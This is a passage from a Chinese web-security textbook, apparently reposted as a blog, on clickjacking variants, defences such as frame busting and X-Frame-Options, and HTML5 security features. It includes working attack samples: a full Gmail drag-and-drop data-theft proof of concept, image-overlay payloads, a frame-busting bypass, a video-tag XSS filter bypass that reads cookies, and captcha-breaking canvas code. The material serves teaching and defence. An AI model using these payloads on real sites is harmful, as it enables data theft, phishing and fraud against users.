<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;iframe scrolling=&quot;no&quot; src=&quot;http://twitter.com/home?status=Yes, I did click the button!!!</div><div class="line">(WHAT!!??)&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
<p>在twitter的URL里通过status参数来控制要发送的内容。攻击者调整页面，使得Tweet按钮被点击劫持。当用户在测试页面点击一个可见的button时，实际上却在不经意间发送了一条微博。</p>
<p><hr /></p>
<h3 id="5-2-Flash点击劫持"><a href="#5-2-Flash点击劫持" class="headerlink" title="5.2 Flash点击劫持"></a>5.2 Flash点击劫持</h3><p>下面来看一个更为严重的ClickJacking攻击案例。攻击者通过Flash构造出了点击劫持，在完成一系列复杂的动作后，最终控制了用户电脑的摄像头。</p>
<p>攻击者制作了一个Flash游戏，并诱使用户来玩这个游戏。这个游戏就是让用户去点击“CLICK”按钮，每次点击后这个按钮的位置都会发生变化。演示点击劫持的Flash游戏<br>在其上隐藏了一个看不见的iframe：Flash上隐藏的iframe窗口<br>游戏中的某些点击是有意义的，某些点击是无效的。攻击通过诱导用户鼠标点击的位置，能够完成一些较为复杂的流程。某些点击是无意义的<br>某些点击是无意义的<br>最终通过这一步步的操作，打开了用户的摄像头。</p>
<p><hr /></p>
<h3 id="5-3-图片覆盖攻击"><a href="#5-3-图片覆盖攻击" class="headerlink" title="5.3 图片覆盖攻击"></a>5.3 图片覆盖攻击</h3><p>图片覆盖攻击<br>点击劫持的本质是一种视觉欺骗。顺着这个思路，还有一些攻击方法也可以起到类似的作用，比如图片覆盖。<br>一名叫sven.vetsch的安全研究者最先提出了这种Cross Site Image Overlaying攻击，简称XSIO。sven.vetsch通过调整图片的style使得图片能够覆盖在他所指定的任意位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;http://disenchant.ch&quot;&gt;</div><div class="line">&lt;img src=http://disenchant.ch/powered.jpg</div><div class="line">style=position:absolute;right:320px;top:90px;/&gt;</div><div class="line">&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>如下所示，覆盖前的页面是：</p>
<p>覆盖前的页面<br>覆盖后的页面变成：<br>覆盖后的页面<br>页面里的logo图片被覆盖了，并指向了sven.vetsch的网站。如果用户此时再去点击logo图片，则会被链接到sven.vetsch的网站。如果这是一个钓鱼网站的话，用户很可能会上当。<br>XSIO不同于XSS，它利用的是图片的style，或者能够控制CSS。如果应用没有限制style的position为absolute的话，图片就可以覆盖到页面上的任意位置，形成点击劫持。<br>百度空间也曾经出现过这个问题，构造代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;/table&gt;&lt;a href=&quot;http://www.ph4nt0m.org&quot;&gt;</div><div class="line">&lt;img src=&quot;http://img.baidu.com/hi/img/portraitn.jpg&quot;</div><div class="line">style=&quot;position:absolute;left:123px;top:123px;&quot;&gt;</div><div class="line">&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>一张头像图片被覆盖到logo处：一张头像图片被覆盖到Logo处<br>点击此图片的话，会被链接到其他网站。<br>图片还可以伪装得像一个正常的链接、按钮；或者在图片中构造一些文字，覆盖在关键的位置，就有可能完全改变页面中想表达的意思，在这种情况下，不需要用户点击，也能达到欺骗的目的。<br>比如，利用XSIO修改页面中的联系电话，可能会导致很多用户上当。<br>由于<img>标签在很多系统中是对用户开放的，因此在现实中有非常多的站点存在被XSIO攻击的可能。在防御XSIO时，需要检查用户提交的HTML代码中，<img>标签的style属性是否可能导致浮出。</p>
<p><hr /></p>
<h3 id="5-4-拖拽劫持与数据窃取"><a href="#5-4-拖拽劫持与数据窃取" class="headerlink" title="5.4 拖拽劫持与数据窃取"></a>5.4 拖拽劫持与数据窃取</h3><p>拖拽劫持与数据窃取<br>2010年，ClickJacking技术有了新的发展。一位名叫Paul Stone的安全研究者在BlackHat 2010大会上发表了题为“Next Generation Clickjacking”的演讲。在该演讲中，提出了“浏览器拖拽事件”导致的一些安全问题。<br>目前很多浏览器都开始支持Drag &amp; Drop 的API。对于用户来说，拖拽使他们的操作更加简单。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此拖拽是不受同源策略限制的。<br>“拖拽劫持”的思路是诱使用户从隐藏的不可见iframe中“拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。</p>
<p>在JavaScript或者Java API的支持下，这个攻击过程会变得非常隐蔽。因为它突破了传统ClickJacking一些先天的局限，所以这种新型的“拖拽劫持”能够造成更大的破坏。</p>
<p>国内的安全研究者xisigr曾经构造了一个针对Gmail的POC，其过程大致如下。首先，制作一个网页小游戏，要把小球拖拽到小海豹的头顶上。<br>演示拖拽劫持的网页小游戏<br>实际上，在小球和小海豹的头顶上都有隐藏的iframe。<br>在这个例子中，xisigr使用event.dataTransfer.getData(‘Text’)来获取“drag”到的数据。当用户拖拽小球时，实际上是选中了隐藏的iframe里的数据；在放下小球时，把数据也放在了隐藏的textarea中，从而完成一次数据窃取的过程。原理示意图<br>这个例子的源代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">  &lt;head&gt;</div><div class="line">    &lt;title&gt;</div><div class="line">      Gmail Clickjacking with drag and drop Attack Demo</div><div class="line">    &lt;/title&gt;</div><div class="line">    &lt;style&gt;</div><div class="line">      .iframe_hidden&#123;height: 50px; width: 50px; top:360px; left:365px; overflow:hidden;</div><div class="line">      filter: alpha(opacity=0); opacity:.0; position: absolute; &#125; .text_area_hidden&#123;</div><div class="line">      height: 30px; width: 30px; top:160px; left:670px; overflow:hidden; filter:</div><div class="line">      alpha(opacity=0); opacity:.0; position: absolute; &#125; .ball&#123; top:350px; left:350px;</div><div class="line">      position: absolute; &#125; .ball_1&#123; top:136px; left:640px; filter: alpha(opacity=0);</div><div class="line">      opacity:.0; position: absolute; &#125;.Dolphin&#123; top:150px; left:600px; position:</div><div class="line">      absolute; &#125;.center&#123; margin-right: auto;margin-left: auto;</div><div class="line">vertical-align:middle;text-align:center;</div><div class="line">      margin-top:350px;&#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">    &lt;script&gt;</div><div class="line">      function Init() &#123;</div><div class="line">        var source = document.getElementById(&quot;source&quot;);</div><div class="line">        var target = document.getElementById(&quot;target&quot;);</div><div class="line">        if (source.addEventListener) &#123;</div><div class="line">          target.addEventListener(&quot;drop&quot;, DumpInfo, false);</div><div class="line">        &#125; else &#123;</div><div class="line">          target.attachEvent(&quot;ondrop&quot;, DumpInfo);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      function DumpInfo(event) &#123;</div><div class="line">        showHide_ball.call(this);</div><div class="line">        showHide_ball_1.call(this);</div><div class="line">        var info = document.getElementById(&quot;info&quot;);</div><div class="line">        info.innerHTML += &quot;&lt;span style=&apos;color:#3355cc;font-size:13px&apos;&gt;&quot; +</div><div class="line">event.dataTransfer.getData(&apos;Text&apos;) + &quot;&lt;/span&gt;&lt;br&gt; &quot;;</div><div class="line">      &#125;</div><div class="line">      function showHide_frame() &#123;</div><div class="line">        var iframe_1 = document.getElementById(&quot;iframe_1&quot;);</div><div class="line">        iframe_1.style.opacity = this.checked ? &quot;0.5&quot;: &quot;0&quot;;</div><div class="line">        iframe_1.style.filter = &quot;progid:DXImageTransform.Microsoft.Alpha(opacity=&quot; +</div><div class="line">(this.checked ? &quot;50&quot;: &quot;0&quot;) + &quot;);&quot;</div><div class="line">      &#125;</div><div class="line">      function showHide_text() &#123;</div><div class="line">        var text_1 = document.getElementById(&quot;target&quot;);</div><div class="line">        text_1.style.opacity = this.checked ? &quot;0.5&quot;: &quot;0&quot;;</div><div class="line">        text_1.style.filter = &quot;progid:DXImageTransform.Microsoft.Alpha(opacity=&quot; +</div><div class="line">(this.checked ? &quot;50&quot;: &quot;0&quot;) + &quot;);&quot;</div><div class="line">      &#125;</div><div class="line">      function showHide_ball() &#123;</div><div class="line">        var hide_ball = document.getElementById(&quot;hide_ball&quot;);</div><div class="line">        hide_ball.style.opacity = &quot;0&quot;;</div><div class="line">        hide_ball.style.filter = &quot;alpha(opacity=0)&quot;;</div><div class="line">      &#125;</div><div class="line">      function showHide_ball_1() &#123;</div><div class="line">        var hide_ball_1 = document.getElementById(&quot;hide_ball_1&quot;);</div><div class="line">        hide_ball_1.style.opacity = &quot;1&quot;;</div><div class="line">        hide_ball_1.style.filter = &quot;alpha(opacity=100)&quot;;</div><div class="line">      &#125;</div><div class="line">      function reload_text() &#123;</div><div class="line">        document.getElementById(&quot;target&quot;).value = &apos;&apos;;</div><div class="line">      &#125;</div><div class="line">    &lt;/script&gt;</div><div class="line">  &lt;/head&gt;</div><div class="line"></div><div class="line">  &lt;body onload=&quot;Init();&quot;&gt;</div><div class="line">    &lt;center&gt;</div><div class="line">      &lt;h1&gt;</div><div class="line">        Gmail Clickjacking with drag and drop Attack</div><div class="line">      &lt;/h1&gt;</div><div class="line">    &lt;/center&gt;</div><div class="line">    &lt;img id=&quot;hide_ball&quot; src=ball.png class=&quot;ball&quot;&gt;</div><div class="line">    &lt;div id=&quot;source&quot;&gt;</div><div class="line">      &lt;iframe id=&quot;iframe_1&quot; src=&quot;https://mail.google.com/mail/ig/mailmax&quot;</div><div class="line">class=&quot;iframe_hidden&quot;</div><div class="line">      scrolling=&quot;no&quot;&gt;</div><div class="line">      &lt;/iframe&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;img src=Dolphin.jpg class=&quot;Dolphin&quot;&gt;</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;img id=&quot;hide_ball_1&quot; src=ball.png class=&quot;ball_1&quot;&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;textarea id=&quot;target&quot; class=&quot;text_area_hidden&quot;&gt;</div><div class="line">      &lt;/textarea&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div id=&quot;info&quot; style=&quot;position:absolute;background-color:#e0e0e0;font-weight:bold;</div><div class="line">top:600px;&quot;&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;center&gt;</div><div class="line">      Note: Clicking &quot;ctrl + a&quot; to select the ball, then drag it to the</div><div class="line">      &lt;br&gt;</div><div class="line">      mouth of the dolphin with the mouse.Make sure you have logged into GMAIL.</div><div class="line">      &lt;br&gt;</div><div class="line">    &lt;/center&gt;</div><div class="line">    &lt;br&gt;</div><div class="line">    &lt;br&gt;</div><div class="line">    &lt;div class=&quot;center&quot;&gt;</div><div class="line">      &lt;center&gt;</div><div class="line">        &lt;center&gt;</div><div class="line">          &lt;input id=&quot;showHide_frame&quot; type=&quot;checkbox&quot;</div><div class="line">onclick=&quot;showHide_frame.call(this);&quot;</div><div class="line">          /&gt;</div><div class="line">          &lt;label for=&quot;showHide_frame&quot;&gt;</div><div class="line">            Show the jacked I--Frame</div><div class="line">          &lt;/label&gt;</div><div class="line">          |</div><div class="line">          &lt;input id=&quot;showHide_text&quot; type=&quot;checkbox&quot; onclick=&quot;showHide_text.call(this);&quot;</div><div class="line">          /&gt;</div><div class="line">          &lt;label for=&quot;showHide_text&quot;&gt;</div><div class="line">            Show the jacked Textarea</div><div class="line">          &lt;/label&gt;</div><div class="line">          |</div><div class="line">          &lt;input type=button value=&quot;Replay&quot; onclick=&quot;location.reload();reload_text();&quot;&gt;</div><div class="line">        &lt;/center&gt;</div><div class="line">        &lt;br&gt;&lt;br&gt;</div><div class="line">        &lt;b&gt;</div><div class="line">          Design by</div><div class="line">          &lt;a target=&quot;_blank&quot; href=&quot;http://hi.baidu.com/xisigr&quot;&gt;</div><div class="line">            xisigr</div><div class="line">          &lt;/a&gt;</div><div class="line">        &lt;/b&gt;</div><div class="line">      &lt;/center&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  &lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>这是一个非常精彩的案例。</p>
<p><hr /></p>
<h3 id="5-5-ClickJacking-3-0：触屏劫持"><a href="#5-5-ClickJacking-3-0：触屏劫持" class="headerlink" title="5.5 ClickJacking 3.0：触屏劫持"></a>5.5 ClickJacking 3.0：触屏劫持</h3><p>到了2010年9月，智能手机上的“触屏劫持”攻击被斯坦福的安全研究者公布，这意味着ClickJacking的攻击方式更进一步。安全研究者将这种触屏劫持称为TapJacking。<br>以苹果公司的iPhone为代表，智能手机为人们提供了更先进的操控方式：触屏。从手机OS的角度来看，触屏实际上就是一个事件，手机OS捕捉这些事件，并执行相应的动作。<br>比如一次触屏操作，可能会对应以下几个事件：<br>touchstart，手指触摸屏幕时发生；<br>touchend，手指离开屏幕时发生；<br>touchmove，手指滑动时发生；<br>touchcancel，系统可取消touch事件。<br>通过将一个不可见的iframe覆盖到当前网页上，可以劫持用户的触屏操作。</p>
<p>而手机上的屏幕范围有限，手机浏览器为了节约空间，甚至隐藏了地址栏，因此手机上的视觉欺骗可能会变得更加容易实施。比如下面这个例子：手机屏幕的视觉欺骗<br>左边的图片，最上方显示了浏览器地址栏，同时攻击者在页面中画出了一个假的地址栏；<br>中间的图片，真实的浏览器地址栏已经自动隐藏了，此时页面中只剩下假的地址栏；<br>右边的图片，是浏览器地址栏被正常隐藏的情况。<br>这种针对视觉效果的攻击可以被利用进行钓鱼和欺诈。<br>2010年12月，研究者发现在Android系统中实施TapJacking甚至可以修改系统的安全设置，并同时给出了演示。<br>在未来，随着移动设备中浏览器功能的丰富，也许我们会看到更多TapJacking的攻击方式。</p>
<p><hr /></p>
<h3 id="5-6-防御ClickJacking"><a href="#5-6-防御ClickJacking" class="headerlink" title="5.6 防御ClickJacking"></a>5.6 防御ClickJacking</h3><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">防御ClickJacking</div></pre></td></tr></table></figure>
<p>针对传统的ClickJacking，一般是通过禁止跨域的iframe来防范。</p>
<p><hr /></p>
<h3 id="5-6-1-frame-busting"><a href="#5-6-1-frame-busting" class="headerlink" title="5.6.1 frame busting"></a>5.6.1 frame busting</h3><p>frame busting</p>
<p>通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。比如下面这段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">if ( top.location != location ) &#123;</div><div class="line">    top.location = self.location;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>常见的frame busting有以下这些方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">if (top != self)</div><div class="line">if (top.location != self.location)</div><div class="line">if (top.location != location)</div><div class="line">if (parent.frames.length &gt; 0)</div><div class="line">if (window != top)</div><div class="line">if (window.top !== window.self)</div><div class="line">if (window.self != window.top)</div><div class="line">if (parent &amp;&amp; parent != window)</div><div class="line">if (parent &amp;&amp; parent.frames &amp;&amp; parent.frames.length&gt;0)</div><div class="line">if((self.parent&amp;&amp;!(self.parent===self))&amp;&amp;(self.parent.frames.length!=0))</div><div class="line">top.location = self.location</div><div class="line">top.location.href = document.location.href</div><div class="line">top.location.href = self.location.href</div><div class="line">top.location.replace(self.location)</div><div class="line">top.location.href = window.location.href</div><div class="line">top.location.replace(document.location)</div><div class="line">top.location.href = window.location.href</div><div class="line">top.location.href = &quot;URL&quot;</div><div class="line">document.write(&apos;&apos;)</div><div class="line">top.location = location</div><div class="line">top.location.replace(document.location)</div><div class="line">top.location.replace(&apos;URL&apos;)</div><div class="line">top.location.href = document.location</div><div class="line">top.location.replace(window.location.href)</div><div class="line">top.location.href = location.href</div><div class="line">self.parent.location = document.location</div><div class="line">parent.location.href = self.document.location</div><div class="line">top.location.href = self.location</div><div class="line">top.location = window.location</div><div class="line">top.location.replace(window.location.pathname)</div><div class="line">window.top.location = window.self.location</div><div class="line">setTimeout(function()&#123;document.body.innerHTML=&apos;&apos;;&#125;,1);</div><div class="line">window.self.onload = function(evt)&#123;document.body.innerHTML=&apos;&apos;;&#125;</div><div class="line">var url = window.location.href; top.location.replace(url)</div></pre></td></tr></table></figure>
<p>但是frame busting也存在一些缺陷。由于它是用JavaScript写的，控制能力并不是特别强，因此有许多方法可以绕过它。<br>比如针对parent.location的frame busting，就可以采用嵌套多个iframe的方法绕过。假设frame busting代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">if ( top.location != self.location) &#123;</div><div class="line">   parent.location = self.location ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>那么通过以下方式即可绕过上面的保护代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Attacker top frame:</div><div class="line">&lt;iframe src=&quot;attacker2 .html&quot;&gt;</div><div class="line">Attacker sub-frame:</div><div class="line">&lt;iframe src=&quot;http://www.victim.com&quot;&gt;</div></pre></td></tr></table></figure>
<p>此外，像HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的JavaScript脚本执行，从而可以使得frame busting失效。<br>斯坦福的Gustav Rydstedt等人总结了一篇关于“攻击frame busting”的paper：“Busting frame busting: a study of clickjacking vulnerabilities at popular sites”，详细讲述了各种绕过frame busting的方法。</p>
<p><hr /></p>
<h3 id="5-6-2-X-Frame-Options"><a href="#5-6-2-X-Frame-Options" class="headerlink" title="5.6.2 X-Frame-Options"></a>5.6.2 X-Frame-Options</h3><p>因为frame busting存在被绕过的可能，所以我们需要寻找其他更好的解决方案。一个比较好的方案是使用一个HTTP头——X-Frame-Options。<br>X-Frame-Options可以说是为了解决ClickJacking而生的，目前有以下浏览器开始支持X-Frame-Options：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">IE 8+</div><div class="line">Opera 10.50+</div><div class="line">Safari 4+</div><div class="line">Chrome 4.1.249.1042+</div><div class="line">Firefox 3.6.9 (or earlier with NoScript)</div></pre></td></tr></table></figure>
<p>它有三个可选的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">DENY</div><div class="line">SAMEORIGIN</div><div class="line">ALLOW-FROM origin</div></pre></td></tr></table></figure>
<p>当值为DENY时，浏览器会拒绝当前页面加载任何frame页面；若值为SAMEORIGIN，则frame页面的地址只能为同源域名下的页面；若值为ALLOW-FROM，则可以定义允许frame加载的页面地址。</p>
<p>除了  <code>X-Frame-Options</code>之外，Firefox的<code>Content Security Policy</code>以及Firefox的NoScript扩展也能够有效防御ClickJacking，这些方案为我们提供了更多的选择。</p>
<p><hr /></p>
<h3 id="5-7-小结"><a href="#5-7-小结" class="headerlink" title="5.7 小结"></a>5.7 小结</h3><p><code>ClickJacking</code></p>
<p><code>ClickJacking</code>相对于XSS与CSRF来说，因为需要诱使用户与页面产生交互行为，因此实施攻击的成本更高，在网络犯罪中比较少见。但<code>ClickJacking</code>在未来仍然有可能被攻击者利用在钓鱼、欺诈和广告作弊等方面，不可不察。</p>
<p><hr /></p>
<h3 id="6-1-1-新标签的XSS"><a href="#6-1-1-新标签的XSS" class="headerlink" title="6.1.1　新标签的XSS"></a>6.1.1　新标签的XSS</h3><p>新标签的XSS</p>
<p>HTML 5定义了很多新标签、新事件，这有可能带来新的XSS攻击。<br>一些XSS Filter如果建立了一个黑名单的话，则可能就不会覆盖到HTML 5新增的标签和功能，从而避免发生XSS。<br>笔者曾经在百度空间做过一次测试，使用的是HTML 5中新增的<video>标签，这个标签可以在网页中远程加载一段视频。与<video>标签类似的还有<audio>标签，用于远程加载一段音频。测试如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"http://tinyvid.tv/file/29d6g90a204i1.ogg"</span></div><div class="line"><span class="attr">onloadedmetadata</span>=<span class="string">"alert(document.cookie);"</span> <span class="attr">ondurationchanged</span>=<span class="string">"alert(/XSS2/);"</span></div><div class="line"><span class="attr">ontimeupdate</span>=<span class="string">"alert(/XSS1/);"</span> <span class="attr">tabindex</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></div></pre></td></tr></table></figure>
<p>成功地绕过了百度空间的XSS Filter：<br>百度空间的XSS<br>HTML 5中新增的一些标签和属性，使得XSS等Web攻击产生了新的变化，为了总结这些变化，有安全研究者建立了一个HTML5 Security Cheatsheet项目，如下所示：<br>此项目对研究HTML 5安全有着重要作用。</p>
<p><hr /></p>
<h3 id="6-1-2-iframe的sandbox"><a href="#6-1-2-iframe的sandbox" class="headerlink" title="6.1.2 iframe的sandbox"></a>6.1.2 iframe的sandbox</h3><p>iframe的sandbox</p>
<p><code>&lt;iframe&gt;</code>标签一直以来都为人所诟病。挂马、XSS、ClickJacking等攻击中都能看到它不光彩的身影。浏览器厂商也一直在想办法限制iframe执行脚本的权限，比如跨窗口访问会有限制，以及IE中的<iframe>标签支持security属性限制脚本的执行，都在向着这一目标努力。<br>在HTML 5中，专门为iframe定义了一个新的属性，叫sandbox。使用sandbox这一个属性后，<code>&lt;iframe&gt;</code>标签加载的内容将被视为一个独立的“源”（源的概念请参考“同源策略”），其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览对象的链接也会被禁止。<br>sandbox属性可以通过参数来支持更精确的控制。有以下几个值可以选择：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">allow-same-origin：允许同源访问；</div><div class="line">allow-top-navigation：允许访问顶层窗口；</div><div class="line">allow-forms：允许提交表单；</div><div class="line">allow-scripts：允许执行脚本。</div><div class="line">可有的行为即便是设置了allow-scripts，也是不允许的，比如“弹出窗口”。</div></pre></td></tr></table></figure>
<p>一个iframe的实例如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-same-origin allow-forms allow-scripts"</span></div><div class="line"><span class="attr">src</span>=<span class="string">"http://maps.example.com/embedded.html"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
<p>毫无疑问，iframe的sandbox属性将极大地增强应用使用iframe的安全性。</p>
<p><hr /></p>
<h3 id="6-1-3-Link-Types-noreferrer"><a href="#6-1-3-Link-Types-noreferrer" class="headerlink" title="6.1.3 Link Types: noreferrer"></a>6.1.3 Link Types: noreferrer</h3><p>Link Types: noreferrer</p>
<p>在HTML 5中为<code>&lt;a&gt;</code>标签和<code>&lt;area&gt;</code>标签定义了一个新的Link Types：noreferrer。<br>顾名思义，标签指定了noreferrer后，浏览器在请求该标签指定的地址时将不再发送Referer。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;xxx&quot; rel=&quot;noreferrer&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>这种设计是出于保护敏感信息和隐私的考虑。因为通过Referer，可能会泄露一些敏感信息。<br>这个标签需要开发者手动添加到页面的标签中，对于有需求的标签可以选择使用noreferrer。</p>
<p><hr /></p>
<h3 id="6-1-4-Canvas的妙用"><a href="#6-1-4-Canvas的妙用" class="headerlink" title="6.1.4 Canvas的妙用"></a>6.1.4 Canvas的妙用</h3><p>Canvas的妙用</p>
<p>Canvas可以说是HTML 5中最大的创新之一。不同于<img>标签只是远程加载一个图片，<canvas>标签让JavaScript可以在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域。Canvas的出现极大地挑战了传统富客户端插件的地位，开发者甚至可以用Canvas在浏览器上写一个小游戏。<br>下面是一个简单的Canvas的用例。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"myCanvas"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">style</span>=<span class="string">"border:1px solid #c3c3c3;"</span>&gt;</span></div><div class="line">    Your browser does not support the canvas element.</div><div class="line">  <span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></div><div class="line"></div><div class="line">  <span class="keyword">var</span> c=<span class="built_in">document</span>.getElementById(<span class="string">"myCanvas"</span>);</div><div class="line">  <span class="keyword">var</span> cxt=c.getContext(<span class="string">"2d"</span>);</div><div class="line">  cxt.fillStyle=<span class="string">"#FF0000"</span>;</div><div class="line">  cxt.fillRect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">150</span>,<span class="number">75</span>);</div><div class="line"></div><div class="line">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在支持Canvas的浏览器上，将描绘出一个图片。</p>
<p>在以下浏览器中，开始支持<canvas>标签。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">IE 7.0+</div><div class="line">Firefox 3.0+</div><div class="line">Safari 3.0+</div><div class="line">Chrome 3.0+</div><div class="line">Opera 10.0+</div><div class="line">iPhone 1.0+</div><div class="line">Android 1.0+</div></pre></td></tr></table></figure>
<p>Dive Into HTML5很好地介绍了Canvas及其他HTML 5的特性。</p>
<p>Canvas提供的强大功能，甚至可以用来破解验证码。Shaun Friedle写了一个GreaseMonkey的脚本，通过JavaScript操作Canvas中的每个像素点，成功地自动化识别了Megaupload提供的验证码。<br>Megaupload验证码<br>其大致过程如下。<br>首先，将图片导入Canvas，并进行转换。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert_grey</span>(<span class="params">image_data</span>)</span>&#123;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; image_data.width; x++)&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> y = <span class="number">0</span>; y &lt; image_data.height; y++)&#123;</div><div class="line">      <span class="keyword">var</span> i = x*<span class="number">4</span>+y*<span class="number">4</span>*image_data.width;</div><div class="line">      <span class="keyword">var</span> luma = <span class="built_in">Math</span>.floor(image_data.data[i] * <span class="number">299</span>/<span class="number">1000</span> +</div><div class="line">        image_data.data[i+<span class="number">1</span>] * <span class="number">587</span>/<span class="number">1000</span> +</div><div class="line">        image_data.data[i+<span class="number">2</span>] * <span class="number">114</span>/<span class="number">1000</span>);</div><div class="line">        image_data.data[i] = luma;</div><div class="line">        image_data.data[i+<span class="number">1</span>] = luma;</div><div class="line">        image_data.data[i+<span class="number">2</span>] = luma;</div><div class="line">        image_data.data[i+<span class="number">3</span>] = <span class="number">255</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//分割不同字符，此处很简单，因为三个字符都使用了不同颜色。</span></div><div class="line">  filter(image_data[<span class="number">0</span>], <span class="number">105</span>);</div><div class="line">  filter(image_data[<span class="number">1</span>], <span class="number">120</span>);</div><div class="line">  filter(image_data[<span class="number">2</span>], <span class="number">135</span>);</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">image_data, colour</span>)</span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; image_data.width; x++)&#123;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> y = <span class="number">0</span>; y &lt; image_data.height; y++)&#123;</div><div class="line">        <span class="keyword">var</span> i = x*<span class="number">4</span>+y*<span class="number">4</span>*image_data.width;</div><div class="line">        <span class="comment">// Turn all the pixels of the certain colour to white</span></div><div class="line">        <span class="keyword">if</span> (image_data.data[i] == colour) &#123;</div><div class="line">          image_data.data[i] = <span class="number">255</span>;</div><div class="line">          image_data.data[i+<span class="number">1</span>] = <span class="number">255</span>;</div><div class="line">          image_data.data[i+<span class="number">2</span>] = <span class="number">255</span>;</div><div class="line"></div><div class="line">          <span class="comment">// Everything else to black</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          image_data.data[i] = <span class="number">0</span>;</div><div class="line">          image_data.data[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">          image_data.data[i+<span class="number">2</span>] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>将字符从背景中分离出来，判断背景颜色即可。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> i = x*<span class="number">4</span>+y*<span class="number">4</span>*image_data.width;</div><div class="line"><span class="keyword">var</span> above = x*<span class="number">4</span>+(y<span class="number">-1</span>)*<span class="number">4</span>*image_data.width;</div><div class="line"><span class="keyword">var</span> below = x*<span class="number">4</span>+(y+<span class="number">1</span>)*<span class="number">4</span>*image_data.width;</div><div class="line"><span class="keyword">if</span> (image_data.data[i] == <span class="number">255</span> &amp;&amp;</div><div class="line">  image_data.data[above] == <span class="number">0</span> &amp;&amp;</div><div class="line">  image_data.data[below] == <span class="number">0</span>)  &#123;</div><div class="line">    image_data.data[i] = <span class="number">0</span>;</div><div class="line">    image_data.data[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">    image_data.data[i+<span class="number">2</span>] = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//再将结果重新绘制。</span></div><div class="line">  